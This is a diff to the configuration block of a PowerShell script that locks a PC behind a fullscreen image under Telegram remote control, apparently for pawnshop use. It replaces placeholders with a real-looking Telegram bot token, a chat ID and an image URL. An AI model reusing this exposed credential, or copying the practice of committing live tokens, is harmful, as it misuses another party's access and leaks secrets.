@@ -1,8 +1,8 @@
 # **Pawnshop Lockdown Script** - Displays a fullscreen image and locks the PC, with Telegram remote control.
 # --- Configuration: update these variables for your environment ---
-$ImageUrl  = "https://example.com/lockscreen.jpg"    # URL of the image to display (LOCK screen image)
-$BotToken  = "123456:ABC-DEF_your_bot_token_here"    # Telegram Bot API token
-$ChatID    = "1234567890"                            # Telegram chat ID to send notifications to
+$ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"    # URL of the image to display (LOCK screen image)
+$BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"    # Telegram Bot API token
+$ChatID    = "656189986"                            # Telegram chat ID to send notifications to
 
 # Identify this PC/user
 $Username  = [Environment]::UserName
